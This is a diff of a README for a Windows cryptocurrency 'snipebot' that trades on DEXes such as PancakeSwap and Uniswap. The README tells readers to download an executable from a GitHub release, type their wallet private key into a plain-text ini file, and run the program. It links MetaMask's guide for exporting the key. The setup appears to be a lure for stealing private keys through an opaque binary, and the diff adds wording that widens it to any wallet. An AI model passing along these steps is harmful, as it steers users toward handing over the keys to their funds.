@@ -7,10 +7,10 @@ Full version sniping bot used to snipe during fair coin launches. With advanced 
 <H2>Getting started</H2>
 
 1. Download the latest release from <a href="https://github.com/JesusCrypto/windows-full-SNIPEBOT-Pancakeswap-Uniswap-Pangolin-Polygon-Bakeryswap/releases">here</a>. ```(verify that the downloaded file has a size of around 60mb, otherwise your downloaded file will be corrupt)```
-2. Open "usersetting.ini" (with notepad for instance) and add your ethereum/bsc address and private key in the corresponding fields after the equal (=). 
+2. Open "usersetting.ini" (with notepad for instance) and add your wallet address and private key in the corresponding fields after the equal (=). 
 <pre>address=0x0000000000000000000000000000000000000000
 privatekey=00000000000000000000000000000000000000000000000000</pre>
-**You can get the private key by following this guide: https://metamask.zendesk.com/hc/en-us/articles/360015289632-How-to-Export-an-Account-Private-Key**
+Note: In theory any wallet that allows you to export the privatekey should work, in particular I work with metamask, **You can get the private key by following this guide: https://metamask.zendesk.com/hc/en-us/articles/360015289632-How-to-Export-an-Account-Private-Key**
 
 3. Run "snipebot.exe" **(To open without problems it is necessary that the files "core.exe, usersetting.ini and configfile.py are in the same folder)**
 
@@ -27,7 +27,7 @@ privatekey=00000000000000000000000000000000000000000000000000</pre>
 
 - Windows 7 x64 (is more stable)
 - The test minimum is 0.0001bnb
-- Keep in mind latency plays a fundamental role when sniping, I recommend a latency of bellow 250ms, this latency depends on your internet provider, you can minimize it by using a quicknode together with a vps.
+- Keep in mind latency plays a fundamental role when sniping, I recommend a latency of bellow 250ms, this latency depends on your internet provider, you can minimize it by using a `"QUICKNODE" together with a "VPS".`
 - The automatic sale can crash the bot on occasion. an attempt is being made to solve its cause in future updates. My strategy that I usually use for an in fair launcher token is the following:
 ```
 * GWEI: 15
